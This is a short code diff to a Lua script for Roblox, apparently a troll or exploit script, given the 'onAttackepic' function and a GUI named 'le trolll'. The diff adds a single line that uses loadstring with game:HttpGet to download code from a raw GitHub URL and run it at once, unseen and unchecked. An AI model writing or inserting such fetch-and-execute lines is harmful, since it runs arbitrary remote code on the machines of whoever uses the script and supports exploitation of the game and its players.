@@ -517,7 +517,7 @@ function onAttackepic()
 		music2:Stop()
 	enabledtp = false
 	game.Players.LocalPlayer.PlayerGui["le trolll"]:Destroy()
-	
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/THISGITHUBHASBEENRETIRED/ROBLOX-SUCKS-/main/ghj"))()
 	end)
 
 
